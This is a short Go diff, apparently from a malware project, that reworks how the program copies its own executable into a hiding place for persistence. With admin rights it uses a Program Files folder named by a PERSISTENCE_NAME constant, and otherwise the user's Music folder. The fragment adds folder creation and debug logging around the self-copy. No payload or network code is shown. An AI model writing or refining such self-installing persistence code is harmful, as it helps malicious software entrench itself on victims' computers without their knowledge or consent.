@@ -78,16 +78,27 @@ func main() {
 		newDir = store.CUSTOM_DIR
 	} else {
 		if store.IsAdmin {
-			newDir = os.Getenv("SYSTEMROOT")
+			newDir = path.Join(
+				os.Getenv("PROGRAMFILES"),
+				store.PERSISTENCE_NAME,
+			)
 		} else {
 			newDir = path.Join(store.HomePath, "Music")
 		}
 	}
 
-	newExecPath := filepath.Join(newDir, newName)
-
-	err := utils.CopyFile(store.ExecPath, newExecPath)
+	err := os.MkdirAll(newDir, 0666)
 	if err != nil {
+		utils.DebugLog(fmt.Sprintf("failed to create dir - %s", err))
+		return
+	}
+
+	newExecPath := filepath.Join(newDir, newName)
+	utils.DebugLog(fmt.Sprintf("new path - %s", newExecPath))
+
+	err = utils.CopyFile(store.ExecPath, newExecPath)
+	if err != nil {
+		utils.DebugLog(fmt.Sprintf("failed to copy file - %s", err))
 		return
 	}
 
